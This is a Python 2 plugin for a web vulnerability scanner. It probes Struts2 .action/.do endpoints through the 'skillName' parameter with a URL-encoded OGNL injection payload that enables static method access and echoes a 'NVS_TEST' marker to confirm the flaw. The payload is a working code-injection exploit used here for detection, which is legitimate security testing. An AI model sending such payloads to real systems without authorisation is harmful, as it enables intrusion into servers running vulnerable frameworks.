#!/usr/bin/python
# -*- coding: utf-8 -*-
import logging
import urllib2
import re
from lib.common import *

def run_url(http,ob,item):
    try:
        if item['method'] != 'get':
            return []
        #end if
        type = item['url'].split('.')[-1]
        type=type.lower()
        if type != 'action' and type != 'do':
            return []
        #end if
        if item['params']!="":
            if item['params'].lower().find("edit")>=0 and item['params'].lower().find("skillname")>=0:
                if item['params'].find("&")>=0:
                    paramslist=item['params'].split("&")
                    newparams=""
                    for s in paramslist:
                        if s.lower().find("skillname")<0:
                            newparams=s+"&"+newparams
                    
                    getnewparams=newparams+"skillName="
                   # url = "%s?%s" % (item['url'],item['params'])
                else:
                    getnewparams="skillName="
            else:
                return []                
        else:
            return []
        url = "%s?%s" % (item['url'],getnewparams)
        list = []
        detail = u"Struts2 框架是在Struts 和WebWork的技术基础上进行了合并后的全新框架。其全新的Struts 2的体系结构与Struts 1的体系结构的差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与Servlet API完全脱离开，所以Struts 2可以理解为WebWork的更新产品。Struts框架广泛应用于政府、公安、交通、金融行业和运营商的网站建设，作为网站开发的底层模板使用，目前大量开发者利用J2ee 开发 Web 应用的时候都会利用这个框架。"
        detail = detail.encode('utf8') 
        test1 = "%25%7B%28%23_memberAccess['allowStaticMethodAccess']=true%29%28%23context['xwork.MethodAccessor.denyMethodExecution']=false%29%28%23hackedbykxlzx=@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29,%23hackedbykxlzx.println%28'NVS_TEST'%29,%23hackedbykxlzx.close%28%29%29%7D"
        yx=urllib2.urlopen("%s%s" % (url,test1))
        if yx.readline().find("NVS_TEST")>=0:
            request = getRequest("%s%s" % (url,test1))
            res = {}
            header = yx.info()
            for key in header:
                res[key] = header[key]
            #end for
            res['status'] = '200'
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))

   
    except Exception,e:
        logging.getLogger().error("File:Structs killScript.py, run_url function :" + str(e) + ",task id:" + ob['task_id'] + ", domain id:" + ob['domain_id'] + ", url:" + item['url'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:Structs killScript.py, run_url function :" + str(e)+ ", url:" + item['url'])
    return list
    #ene  try
#end def




